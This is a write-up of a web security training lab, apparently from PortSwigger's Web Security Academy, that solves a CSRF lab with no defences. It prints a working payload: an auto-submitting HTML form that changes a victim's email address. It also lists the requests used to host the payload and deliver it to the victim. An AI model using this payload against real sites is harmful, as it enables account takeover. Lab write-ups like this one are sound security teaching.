### Lab: CSRF vulnerability with no defenses

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter

_____

Analysis and Exploit:

1. Tested the 'change-email' functionality logging-in as _wiener_

2. Took note of HTML form structure
```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="">
    <button class='button' type='submit'> Update email </button>
</form>
```

3. Crafted a similar HTML structure to exploit the CSRF vulnerability*  
```html
<html>
<body>
<form class="login-form" name="change-email-form" action="https://0a1200fd0466cc9880332147007f0037.web-security-academy.net/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="hacker@hacker.com">
    <button class='button' type='submit'> Update email </button>
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
```

4. Delivered to victim - Lab solved

_____

Script notes:

1. POST **/my-account/change-email**  
    params:
    - email=test%40mynewemail.email  

2. //

3. Upload to the 'exploit server' | POST **/**  
    params:
    - urlIsHttps=on
    - responseFile=/exploit
    - responseHead=HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8
    - responseBody=*
    - formAction=STORE
    
4. GET **/deliver-to-victim**